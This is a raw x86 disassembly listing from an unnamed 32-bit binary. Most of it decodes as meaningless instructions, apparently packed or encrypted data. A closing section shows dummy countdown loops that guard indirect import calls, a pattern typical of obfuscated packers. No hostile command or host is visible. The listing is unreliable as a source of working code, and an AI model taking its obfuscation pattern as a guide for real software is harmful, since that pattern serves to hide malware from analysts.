  40ba9d:	xor    BYTE PTR [edx+0x4b353248],ah
  40baa3:	loope  0x40ba83
  40baa5:	mov    eax,0x21409659
  40baaa:	imul   ecx,ecx,0xffffffea
  40baad:	das    
  40baae:	and    eax,DWORD PTR [eax+0x747ab195]
  40bab4:	cmp    eax,0x5c2b0b20
  40bab9:	ret    
  40baba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40babb:	mov    ecx,0x7f48b700
  40bac0:	or     DWORD PTR [bx],ebp
  40bac3:	inc    ebp
  40bac4:	shl    DWORD PTR [esi-0x73],cl
  40bac7:	cmp    BYTE PTR [edi+ebx*2],0xf7
  40bacb:	outs   dx,BYTE PTR ds:[esi]
  40bacc:	aas    
  40bacd:	(bad)  
  40bace:	popf   
  40bacf:	daa    
  40bad0:	pop    eax
  40bad1:	and    eax,0x39b0a740
  40bad6:	xor    bl,bh
  40bad8:	sub    DWORD PTR [ecx],ebp
  40bada:	in     al,0x47
  40badc:	rcr    DWORD PTR [ecx],1
  40bade:	ret    0x6250
  40bae1:	mov    esp,DWORD PTR [ebx-0x1803bac3]
  40bae7:	(bad)  
  40bae8:	hlt    
  40bae9:	xchg   ecx,eax
  40baea:	push   0x25
  40baec:	mov    ds:0x3d4c0a7a,eax
  40baf1:	xor    DWORD PTR [eax-0x2d688758],ecx
  40baf7:	aaa    
  40baf8:	mov    edx,0xa65e5470
  40bafd:	sbb    esp,0x2c
  40bb00:	pop    esi
  40bb01:	xor    ch,BYTE PTR [esi+0x75]
  40bb04:	and    dh,al
  40bb06:	in     al,0x5c
  40bb08:	mov    al,ds:0xed73d0eb
  40bb0d:	mov    DWORD PTR es:[edi+0x1c],ebx
  40bb11:	aas    
  40bb12:	pop    ss
  40bb13:	dec    ebp
  40bb14:	lods   eax,DWORD PTR ds:[esi]
  40bb15:	ds es mov ss:0x1124b3f8,eax
  40bb1d:	dec    ebp
  40bb1f:	mov    edx,0xa0bb8495
  40bb24:	lods   eax,DWORD PTR ds:[esi]
  40bb25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb26:	(bad)  
  40bb27:	shr    BYTE PTR [edx+0x77],1
  40bb2a:	add    al,al
  40bb2c:	or     eax,0x6d3ef5c9
  40bb31:	jae    0x40bb21
  40bb33:	fdivr  DWORD PTR [ebp+0x1e]
  40bb36:	push   esi
  40bb37:	jmp    0x40bbb3
  40bb39:	pop    edx
  40bb3a:	fisubr DWORD PTR [ebp+0x20ca34aa]
  40bb40:	in     eax,0x13
  40bb42:	rol    DWORD PTR [ecx-0x32248119],0x5d
  40bb49:	lahf   
  40bb4a:	lahf   
  40bb4b:	mov    ds:0x7b388390,al
  40bb50:	jmp    0x7793:0x8cad4ac0
  40bb57:	xor    al,0xde
  40bb59:	add    esp,DWORD PTR ds:[esi-0x67cbd35f]
  40bb60:	pop    ebx
  40bb61:	outs   dx,DWORD PTR ds:[esi]
  40bb62:	xchg   esp,eax
  40bb63:	xor    eax,0x7a60629b
  40bb68:	aad    0xfe
  40bb6a:	pop    esi
  40bb6b:	loopne 0x40bb47
  40bb6d:	popf   
  40bb6e:	mov    cl,0x2d
  40bb70:	inc    ebp
  40bb71:	push   esp
  40bb72:	cdq    
  40bb73:	xchg   edi,eax
  40bb74:	dec    eax
  40bb75:	add    dl,BYTE PTR [edi+esi*1]
  40bb78:	mov    edi,0xe8712c14
  40bb7d:	pop    ebp
  40bb7e:	in     eax,0x92
  40bb80:	les    ebx,FWORD PTR [esi+ebx*2+0x4f]
  40bb84:	mov    ebx,0xb49a2a58
  40bb89:	ss dec esi
  40bb8b:	daa    
  40bb8c:	iret   
  40bb8d:	push   esi
  40bb8e:	cmp    eax,0xfcb7f1e4
  40bb93:	jle    0x40bbc0
  40bb95:	loop   0x40bb43
  40bb97:	mov    dh,0xaa
  40bb99:	lock int3 
  40bb9b:	mov    ch,0xfe
  40bb9d:	cmp    ebx,esp
  40bb9f:	push   0x54276a5a
  40bba4:	cmp    cl,BYTE PTR [ecx]
  40bba6:	mov    WORD PTR [ebp-0x65],cs
  40bba9:	xchg   ebp,eax
  40bbaa:	xor    ebx,edi
  40bbac:	cmp    bl,BYTE PTR [esi+0x5f5f5a88]
  40bbb2:	cmp    al,0x95
  40bbb4:	xchg   edi,eax
  40bbb5:	xchg   edi,eax
  40bbb6:	mov    bh,BYTE PTR [edx]
  40bbb8:	pop    edx
  40bbb9:	sti    
  40bbba:	pop    esp
  40bbbb:	arpl   WORD PTR [edx+eax*2-0x3c],dx
  40bbbf:	js     0x40bb46
  40bbc1:	iret   
  40bbc2:	jl     0x40bbcb
  40bbc4:	sbb    DWORD PTR [edi+edi*8],ebp
  40bbc7:	push   esp
  40bbc8:	adc    BYTE PTR [ebx],ch
  40bbca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbcb:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbcd:	stc    
  40bbce:	ins    BYTE PTR es:[edi],dx
  40bbcf:	mov    esi,0x5c3c846d
  40bbd4:	shl    BYTE PTR [edx-0x7a196180],0x98
  40bbdb:	mov    ds:0x1897c903,al
  40bbe0:	or     edx,DWORD PTR [esi+0x148efaf9]
  40bbe6:	shld   edi,edi,0x5d
  40bbea:	dec    ebx
  40bbeb:	in     eax,dx
  40bbec:	sbb    eax,0x1295a6e8
  40bbf1:	imul   esp,esi,0x75
  40bbf4:	jmp    esp
  40bbf6:	ja     0x40bc3e
  40bbf8:	stos   BYTE PTR es:[edi],al
  40bbf9:	ins    BYTE PTR es:[edi],dx
  40bbfa:	mov    dl,0xb5
  40bbfc:	out    dx,al
  40bbfd:	arpl   bp,bx
  40bbff:	fdivr  QWORD PTR [ebx-0x1e]
  40bc02:	lea    ecx,[edx+0x5f95cd1f]
  40bc08:	mov    esi,0x42b55ed9
  40bc0d:	xchg   esi,eax
  40bc0e:	hlt    
  40bc0f:	xchg   edx,eax
  40bc10:	mov    bl,0xfa
  40bc12:	ror    DWORD PTR [esi+eiz*8-0x7e5a86f8],0xae
  40bc1a:	sti    
  40bc1b:	(bad)  
  40bc1c:	push   edi
  40bc1d:	push   es
  40bc1e:	xlat   BYTE PTR ds:[ebx]
  40bc1f:	pop    eax
  40bc20:	or     BYTE PTR [ecx],bh
  40bc22:	push   0x53fff07f
  40bc27:	xchg   ebx,eax
  40bc28:	pusha  
  40bc29:	clc    
  40bc2a:	aaa    
  40bc2b:	or     ebx,eax
  40bc2d:	nop
  40bc2e:	pushf  
  40bc2f:	cld    
  40bc30:	xor    dl,ch
  40bc32:	in     eax,0xa8
  40bc34:	or     eax,0x79aa25b1
  40bc39:	shl    cl,0xb
  40bc3c:	jns    0x40bc3c
  40bc3e:	stos   DWORD PTR es:[edi],eax
  40bc3f:	sub    ebp,0xf73ef6f4
  40bc45:	and    eax,0x29cd4d8
  40bc4a:	xchg   edx,eax
  40bc4b:	int    0x6c
  40bc4d:	fstp   TBYTE PTR [edi+ecx*8+0x77]
  40bc51:	inc    edi
  40bc52:	push   0xffffffd5
  40bc54:	xchg   ebx,eax
  40bc55:	mov    edx,ebp
  40bc57:	mov    ds:0xeaf5be97,eax
  40bc5c:	ret    
  40bc5d:	push   es
  40bc5e:	cmpxchg BYTE PTR [edi+0x73],bh
  40bc62:	jo     0x40bcb6
  40bc64:	xor    eax,0x1a4ef0a4
  40bc69:	adc    BYTE PTR [esi],cl
  40bc6b:	(bad)  
  40bc6c:	xchg   ebx,eax
  40bc6d:	lock loope 0x40bc4c
  40bc70:	mov    ah,0x8
  40bc72:	xor    al,BYTE PTR [edx+ebp*8]
  40bc75:	(bad)  
  40bc76:	cmp    BYTE PTR [esp+edx*2-0x65],cl
  40bc7a:	lods   eax,DWORD PTR ds:[esi]
  40bc7b:	xor    cl,dh
  40bc7d:	inc    esi
  40bc7e:	adc    eax,0xbc3ddb07
  40bc83:	inc    eax
  40bc84:	adc    ah,bl
  40bc86:	mov    ch,0x6e
  40bc88:	xor    ch,dl
  40bc8a:	pop    ebx
  40bc8b:	jmp    0x555e:0x3fbbc8d
  40bc92:	div    DWORD PTR ds:0xf571a52
  40bc98:	sub    bl,ch
  40bc9a:	cmp    al,0x6c
  40bc9c:	js     0x40bcc2
  40bc9e:	mov    eax,ds:0xaef415cd
  40bca3:	addr16 dec ebx
  40bca5:	xchg   ecx,eax
  40bca6:	pop    edx
  40bca7:	aam    0x82
  40bca9:	add    eax,0x7a667e8e
  40bcae:	push   es
  40bcaf:	pop    esp
  40bcb0:	je     0x40bcef
  40bcb2:	and    eax,0x404f7226
  40bcb7:	fisttp QWORD PTR [eax]
  40bcb9:	ja     0x40bca8
  40bcbb:	cli    
  40bcbc:	(bad)  
  40bcbd:	fs and DWORD PTR es:[ecx],ebp
  40bcc1:	jns    0x40bc46
  40bcc3:	push   ecx
  40bcc4:	sub    ebx,ecx
  40bcc6:	inc    ecx
  40bcc7:	aas    
  40bcc8:	push   ebp
  40bcc9:	test   al,0x1e
  40bccb:	adc    ah,cl
  40bccd:	mov    ecx,?
  40bccf:	sub    ebp,DWORD PTR [ebx+0x3f0d1f3d]
  40bcd5:	test   DWORD PTR [ebx+0x79],ebx
  40bcd8:	imul   edx,ecx
  40bcdb:	cdq    
  40bcdc:	mov    esi,edi
  40bcde:	jnp    0x40bce2
  40bce0:	(bad)  
  40bce1:	je     0x40bd34
  40bce3:	push   ebx
  40bce4:	sar    dh,1
  40bce6:	inc    ebx
  40bce7:	jg     0x40bce2
  40bce9:	cmp    eax,0xf6890836
  40bcee:	call   0x3c1387b2
  40bcf3:	sub    eax,0x1ac1ee3
  40bcf8:	call   0xf841:0xf6204beb
  40bcff:	shl    bl,1
  40bd01:	cs push ecx
  40bd03:	lahf   
  40bd04:	ins    DWORD PTR es:[edi],dx
  40bd05:	cmp    BYTE PTR [ebx],ch
  40bd07:	cmp    eax,0x118406f0
  40bd0c:	jmp    0x675b:0xe8e125c6
  40bd13:	call   0x3ac0:0x6661a435
  40bd1a:	xor    DWORD PTR [edx+0x30],ebx
  40bd1d:	arpl   WORD PTR [edi+0x49b85782],si
  40bd23:	pop    eax
  40bd24:	dec    ebp
  40bd25:	ret    0x7680
  40bd28:	daa    
  40bd29:	add    bl,ch
  40bd2b:	enter  0xe538,0x49
  40bd2f:	xchg   edx,eax
  40bd30:	mov    ebx,0xc915794a
  40bd35:	(bad)  
  40bd36:	loop   0x40bd21
  40bd38:	inc    edx
  40bd39:	cdq    
  40bd3a:	in     eax,dx
  40bd3b:	adc    bh,cl
  40bd3d:	add    DWORD PTR [esi-0x41],esi
  40bd40:	adc    al,0xbd
  40bd42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd43:	dec    edx
  40bd44:	fsub   QWORD PTR [ebp+0x45]
  40bd47:	jnp    0x40bdb3
  40bd49:	(bad)  
  40bd4a:	ins    BYTE PTR es:[edi],dx
  40bd4b:	add    al,0xd0
  40bd4d:	sub    BYTE PTR [ecx],0x8b
  40bd50:	or     DWORD PTR [ecx+0x31ce908],ecx
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	dec    ebp
  40bd65:	ffreep st(1)
  40bd67:	and    eax,0x7e7e821c
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	add    edi,esp
  40bd72:	sub    eax,esi
  40bd74:	scas   eax,DWORD PTR es:[edi]
  40bd75:	enter  0x9224,0x4c
  40bd79:	mov    BYTE PTR [edx-0x5f7a03d9],dl
  40bd7f:	inc    ecx
  40bd80:	sbb    dh,BYTE PTR [ebx+0x10dfca36]
  40bd86:	jecxz  0x40bdbe
  40bd88:	dec    edi
  40bd89:	mov    ebx,0x236691b9
  40bd8e:	xchg   ebx,eax
  40bd8f:	loop   0x40bdb0
  40bd91:	xchg   edi,eax
  40bd92:	aas    
  40bd93:	aam    0x52
  40bd95:	ins    BYTE PTR es:[edi],dx
  40bd96:	addr16 leave 
  40bd98:	nop
  40bd99:	sar    BYTE PTR [ebx+0x3ccce8be],0xdc
  40bda0:	push   ecx
  40bda1:	into   
  40bda2:	cld    
  40bda3:	imul   edi,DWORD PTR [ecx+0x60e585c7],0x4d
  40bdaa:	ss repnz dec ebx
  40bdad:	dec    ecx
  40bdae:	adc    BYTE PTR [ebx+0x5321c988],cl
  40bdb4:	sbb    eax,0x7bb1cbb3
  40bdb9:	adc    BYTE PTR [ebp-0x23dc748c],al
  40bdbf:	mov    eax,0x84fbd997
  40bdc4:	repz pop eax
  40bdc6:	pop    ds
  40bdc7:	das    
  40bdc8:	mov    cl,0x59
  40bdca:	cmp    DWORD PTR [ecx+0x55],esi
  40bdcd:	(bad)  
  40bdcf:	lods   al,BYTE PTR ds:[esi]
  40bdd0:	(bad)  
  40bdd1:	pop    ebp
  40bdd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd3:	hlt    
  40bdd4:	and    ebx,ecx
  40bdd6:	push   0x77
  40bdd8:	pmuludq mm7,QWORD PTR [edx-0x6f]
  40bddc:	shl    BYTE PTR [edx-0x1b63f1db],0x53
  40bde3:	xchg   ecx,eax
  40bde4:	xor    bh,cl
  40bde6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bde7:	mov    WORD PTR [ecx+edi*2+0x69ebf8f0],fs
  40bdee:	mov    ebp,DWORD PTR [eax-0xd]
  40bdf1:	jbe    0x40bd99
  40bdf3:	call   DWORD PTR [edx]
  40bdf5:	adc    BYTE PTR [ecx],bl
  40bdf7:	shr    DWORD PTR [edx+0x50eeb24f],cl
  40bdfd:	xor    eax,0x3f2e01f
  40be02:	mov    BYTE PTR [eax-0x2c],0x60
  40be06:	retf   0x2496
  40be09:	lods   eax,DWORD PTR ds:[esi]
  40be0a:	ja     0x40bda5
  40be0c:	ins    DWORD PTR es:[edi],dx
  40be0d:	mov    esi,0xfb22e2a9
  40be12:	and    BYTE PTR [ebx+0x7dfd5afa],0x56
  40be19:	xchg   edi,eax
  40be1a:	dec    edi
  40be1b:	test   eax,0xb885aba8
  40be20:	sbb    BYTE PTR [edx],ch
  40be22:	cmp    BYTE PTR [esi+0xe],bl
  40be25:	dec    ebp
  40be26:	ror    DWORD PTR [esi+0x4fecc7f2],1
  40be2c:	data16 mov cl,0x2a
  40be2f:	sbb    cl,BYTE PTR [edx+0xb585db]
  40be35:	pop    es
  40be36:	test   eax,0x436bbb29
  40be3b:	fldenv [edi-0x67c4d213]
  40be41:	cmp    eax,0xe8adaafd
  40be46:	pop    edx
  40be47:	fsubr  DWORD PTR [ecx]
  40be49:	popa   
  40be4a:	neg    BYTE PTR [ecx]
  40be4c:	inc    esi
  40be4d:	cmp    ecx,DWORD PTR [ebp+0x28e0eefe]
  40be53:	stos   BYTE PTR es:[edi],al
  40be54:	sub    bh,BYTE PTR [ecx-0x4c859605]
  40be5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be5b:	push   ss
  40be5c:	or     al,0xc2
  40be5e:	loope  0x40bea5
  40be60:	stos   DWORD PTR es:[edi],eax
  40be61:	sub    bl,BYTE PTR [ecx-0x5b]
  40be64:	xchg   esi,eax
  40be65:	daa    
  40be66:	adc    BYTE PTR [esi+edx*1],cl
  40be69:	add    al,0xb3
  40be6b:	add    BYTE PTR [ecx+0x75],dh
  40be6e:	and    BYTE PTR [ebx],bl
  40be70:	dec    edx
  40be71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be72:	cmp    ebx,DWORD PTR [eax]
  40be74:	gs add al,0xa6
  40be77:	sub    DWORD PTR [eax-0x11],edx
  40be7a:	and    BYTE PTR [ecx-0x1099fa5d],bh
  40be80:	jmp    0x40be5f
  40be82:	add    cl,bh
  40be84:	jg     0x40bea6
  40be86:	push   ecx
  40be87:	sbb    al,0x2b
  40be89:	aam    0xfb
  40be8b:	and    eax,0xb05a92f5
  40be90:	or     edx,esp
  40be92:	sar    DWORD PTR [esp+ecx*4],0xb2
  40be96:	inc    edi
  40be97:	bnd jbe 0x40bea3
  40be9a:	retf   0xe96
  40be9d:	popf   
  40be9e:	mov    al,ds:0xf9ede4d1
  40bea3:	adc    bl,bh
  40bea5:	retf   
  40bea6:	sbb    al,0x4a
  40bea8:	inc    esi
  40bea9:	inc    ebx
  40beaa:	out    0xa1,eax
  40beac:	add    DWORD PTR [ebx-0x26],ecx
  40beaf:	mov    bh,0x4e
  40beb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb2:	jmp    0x5d4e1244
  40beb7:	or     dl,BYTE PTR [esi-0x47730f9c]
  40bebd:	out    0xc5,eax
  40bebf:	push   eax
  40bec0:	jp     0x40bf1e
  40bec2:	push   eax
  40bec3:	cwde   
  40bec4:	lea    eax,[ebx+edx*8+0x4e]
  40bec8:	add    DWORD PTR [ebp-0x567fd825],esp
  40bece:	sbb    esp,edx
  40bed0:	lea    ebp,[ebp-0x36]
  40bed3:	test   BYTE PTR [edx+0x14bfc724],dl
  40bed9:	jmp    0x4170c0af
  40bede:	mov    ecx,0x6f65d09
  40bee3:	cld    
  40bee4:	add    edx,DWORD PTR [edi+0x5bdcc6aa]
  40beea:	sahf   
  40beeb:	stc    
  40beec:	mov    esi,0xd39dbe61
  40bef1:	fs pop ecx
  40bef3:	pop    ebx
  40bef4:	dec    ebx
  40bef5:	dec    ecx
  40bef6:	mov    bl,0x2
  40bef8:	mov    ebp,DWORD PTR [ebx+0x142f2324]
  40befe:	add    al,ch
  40bf00:	je     0x40be89
  40bf02:	xchg   edx,eax
  40bf03:	mov    ecx,0xc69ac734
  40bf08:	int    0x4
  40bf0a:	loope  0x40bea0
  40bf0c:	(bad)  
  40bf0d:	daa    
  40bf0e:	or     bh,BYTE PTR [eax-0x2717937]
  40bf14:	jge    0x40bf1d
  40bf16:	lock inc ebx
  40bf18:	aad    0xab
  40bf1a:	pusha  
  40bf1b:	ja     0x40bf01
  40bf1d:	push   edx
  40bf1e:	xor    BYTE PTR [esi-0x153cd950],ah
  40bf24:	xor    DWORD PTR [ebx-0x28],0xffffffac
  40bf28:	push   ebp
  40bf29:	mov    ch,0xfa
  40bf2b:	inc    esi
  40bf2c:	out    0x5a,eax
  40bf2e:	out    0xd4,al
  40bf30:	aad    0x86
  40bf32:	outs   dx,DWORD PTR ds:[esi]
  40bf33:	add    eax,0x29187bfa
  40bf38:	mov    ds,ebx
  40bf3a:	ror    DWORD PTR [ebp+0x2e],0xb5
  40bf3e:	sub    BYTE PTR [esi-0x78],al
  40bf41:	jp     0x40bf60
  40bf43:	xor    DWORD PTR [ebp-0x3a9b6c21],esp
  40bf49:	(bad)  
  40bf4a:	pop    esi
  40bf4b:	cmp    ch,BYTE PTR [eax+0x5e]
  40bf4e:	push   0x990621cd
  40bf53:	sub    BYTE PTR [edx],cl
  40bf55:	addr16 adc al,0x2b
  40bf58:	sbb    BYTE PTR [ecx+0x1b],0x57
  40bf5c:	xor    BYTE PTR [ecx-0xe],bh
  40bf5f:	imul   esp,ebp,0x1f
  40bf62:	in     al,dx
  40bf63:	lock gs retf 0x48e6
  40bf68:	(bad)  [eax-0x2b]
  40bf6b:	adc    al,0xab
  40bf6d:	mov    ch,0x8
  40bf6f:	in     eax,0xe2
  40bf71:	or     edi,DWORD PTR [ebx+eiz*1+0x14c938c7]
  40bf78:	(bad)  
  40bf79:	cmc    
  40bf7a:	inc    edx
  40bf7b:	cwde   
  40bf7c:	retf   
  40bf7d:	xor    edx,DWORD PTR [edi]
  40bf7f:	hlt    
  40bf80:	or     DWORD PTR [eax-0x20226f4c],eax
  40bf86:	data16 (bad) 
  40bf88:	fcom   DWORD PTR [esi]
  40bf8a:	or     DWORD PTR ds:0x4b606cc7,eax
  40bf90:	(bad)  
  40bf91:	mov    ebp,?
  40bf93:	iret   
  40bf94:	or     eax,0x55d9cc77
  40bf99:	push   eax
  40bf9a:	ja     0x40c011
  40bf9c:	rol    DWORD PTR [eax+eiz*1],1
  40bf9f:	ret    0x2071
  40bfa2:	cmp    edi,edx
  40bfa4:	mov    eax,0x8d9faffa
  40bfa9:	add    al,0x57
  40bfab:	pop    esp
  40bfac:	mov    ecx,0xa3e3ca11
  40bfb1:	outs   dx,DWORD PTR ds:[esi]
  40bfb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb3:	jle    0x40bf38
  40bfb5:	xor    esi,DWORD PTR [esi-0x75b80a81]
  40bfbb:	mov    esp,0x9e3a4401
  40bfc0:	mov    dh,0xe0
  40bfc2:	jb     0x40c00d
  40bfc4:	(bad)  
  40bfc5:	push   cs
  40bfc6:	xchg   edx,eax
  40bfc7:	dec    eax
  40bfc8:	dec    edi
  40bfc9:	aas    
  40bfca:	repz mov ebx,0x401bcb29
  40bfd0:	adc    cl,bl
  40bfd2:	xchg   esi,eax
  40bfd3:	(bad)  
  40bfd4:	int    0x85
  40bfd6:	push   cs
  40bfd7:	mov    BYTE PTR [eax],bl
  40bfd9:	mov    al,0xd0
  40bfdb:	fisttp WORD PTR [eax+0x5]
  40bfde:	xchg   ebp,eax
  40bfdf:	mov    eax,0x2fe7396
  40bfe4:	add    edi,DWORD PTR gs:[ebx+0x3f681f5f]
  40bfeb:	xor    BYTE PTR [ebx+ecx*8-0x128e8ab9],bl
  40bff2:	mov    ch,0x4f
  40bff4:	mov    al,0xdb
  40bff6:	dec    edi
  40bff7:	xchg   ecx,eax
  40bff8:	sbb    al,bl
  40bffa:	push   0x3e8d3898
  40bfff:	sub    al,0x6
  40c001:	fs ss scas al,BYTE PTR es:[edi]
  40c004:	dec    esp
  40c005:	dec    edi
  40c006:	aas    
  40c007:	jecxz  0x40bfd9
  40c009:	das    
  40c00a:	fist   DWORD PTR [ecx+0x7c]
  40c00d:	mov    esp,DWORD PTR [esi+0x63]
  40c010:	adc    bl,dl
  40c012:	out    0x94,eax
  40c014:	mov    BYTE PTR [esi+0x62b8a3d],ch
  40c01a:	xchg   edi,eax
  40c01b:	in     eax,0x22
  40c01d:	(bad)  
  40c01e:	mov    fs,WORD PTR [edi]
  40c020:	int    0xfd
  40c022:	pop    ecx
  40c023:	or     cx,dx
  40c026:	pop    ds
  40c027:	cmp    esp,eax
  40c029:	ds cdq 
  40c02b:	test   BYTE PTR [ebx+0x61ad5566],ch
  40c031:	mov    eax,ds:0x3f46f641
  40c036:	stc    
  40c037:	push   ecx
  40c038:	add    al,0xb3
  40c03a:	fidiv  WORD PTR [ebx-0x66]
  40c03d:	xor    al,0xfb
  40c03f:	pop    es
  40c040:	xor    eax,DWORD PTR [ebx]
  40c042:	mov    bh,0x2b
  40c044:	mov    WORD PTR [esi-0x7ead9e1a],ds
  40c04a:	jp     0x40c052
  40c04c:	shr    DWORD PTR [edi+0x64],cl
  40c04f:	mov    dl,0x81
  40c051:	mov    cl,0x5
  40c053:	(bad)  [edx]
  40c055:	xchg   ebx,eax
  40c056:	add    DWORD PTR [eax+0x6d52a6fd],esi
  40c05c:	mov    edi,0xeacb5adb
  40c061:	mov    edi,0x448a93aa
  40c066:	adc    eax,0x15ebc6b5
  40c06b:	daa    
  40c06c:	fmul   st(5),st
  40c06e:	jle    0x40c05a
  40c070:	cld    
  40c071:	jge    0x40c0a3
  40c073:	cwde   
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433617,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433627
  40c0b4:	and    DWORD PTR ds:0x433683,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4336b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4336b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4336b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4336b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4336b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4336e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4336e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4336e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4336e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4336e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4336e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4336e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4336e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433683,0x1d
  40c169:	cmp    DWORD PTR ds:0x433683,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433683,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433780
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433683,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433683
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433683,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433683
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433683,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4336ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4336b7
  40c1dd:	xor    DWORD PTR ds:0x433613,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43361b,0x43367b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43362b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4336a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4336a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4336a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4336a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4336a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4336eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4336eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4336eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4336eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4336eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4336eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4336eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4336eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433633,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433633
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433633,esi
  40c2c4:	cmp    DWORD PTR ds:0x433633,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433633,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4336f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4336eb
  40c301:	adc    DWORD PTR ds:0x4336fb,ecx
  40c307:	imul   edx,eax
